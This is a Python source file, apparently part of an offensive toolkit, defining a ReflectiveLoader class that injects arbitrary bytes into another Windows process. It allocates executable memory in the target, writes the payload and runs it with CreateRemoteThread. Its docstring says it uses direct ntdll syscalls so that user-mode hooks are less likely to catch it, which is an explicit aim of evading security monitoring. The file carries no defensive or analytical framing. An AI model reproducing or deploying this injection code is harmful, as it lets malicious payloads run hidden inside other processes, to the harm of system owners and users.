import os
import ctypes

if os.name == 'nt':
    from ctypes import wintypes
else:
    # minimal placeholder for type hints on non-Windows
    class _Wintypes:
        HANDLE = ctypes.c_void_p

    wintypes = _Wintypes()
from engines.windows.vx_eng import WinEngine, TriadMemoryError, MemFlags, WinProtect


class ReflectiveLoader:
    """Utility for loading arbitrary bytes into a remote process and executing them.

    Designed to be used with the dynamic syscall resolver already present in
    the WinEngine. The loader allocates RWX memory in the target, writes the
    payload, and spins up a remote thread at the base address. Because we rely
    on ntdll syscalls, the operation is less likely to be intercepted by user-
    mode hooks.
    """

    def __init__(self, engine: WinEngine):
        self.engine = engine

    async def load_bytes(self, pid: int, data: bytes) -> wintypes.HANDLE:
        """Load the raw bytes into the remote process and return a thread handle."""
        # open process with necessary rights
        hproc = await self.engine.open_process(pid)

        # allocate memory using NtAllocateVirtualMemory if available
        base = ctypes.c_void_p(0)
        size = ctypes.c_size_t(len(data))
        status = None
        if hasattr(self.engine, "NtAllocateVirtualMemory"):
            status = self.engine.NtAllocateVirtualMemory(
                hproc,
                ctypes.byref(base),
                0,
                ctypes.byref(size),
                MemFlags.COMMIT | MemFlags.RESERVE,
                WinProtect.EXECUTE_READWRITE,
            )
            if status != 0:
                raise TriadMemoryError("NtAllocateVirtualMemory failed", error_code=status)
        else:
            base = self.engine.VirtualAllocEx(
                hproc, None, len(data), MemFlags.COMMIT | MemFlags.RESERVE, WinProtect.EXECUTE_READWRITE
            )
            if not base:
                raise TriadMemoryError("VirtualAllocEx failed")
        # write payload
        written = ctypes.c_size_t()
        if hasattr(self.engine, "NtWriteVirtualMemory"):
            status = self.engine.NtWriteVirtualMemory(
                hproc, base, data, size, ctypes.byref(written)
            )
            if status != 0:
                raise TriadMemoryError("NtWriteVirtualMemory failed", error_code=status)
        else:
            res = self.engine.WriteProcessMemory(
                hproc, base, data, len(data), ctypes.byref(written)
            )
            if not res:
                raise TriadMemoryError("WriteProcessMemory failed")

        # execute via remote thread
        thread = self.engine.CreateRemoteThread(
            hproc, None, 0, base, None, 0, None
        )
        if not thread:
            raise TriadMemoryError("CreateRemoteThread failed")
        return thread

    async def load_dll(self, pid: int, dll_bytes: bytes) -> wintypes.HANDLE:
        """Convenience wrapper; identical to load_bytes for now."""
        return await self.load_bytes(pid, dll_bytes)
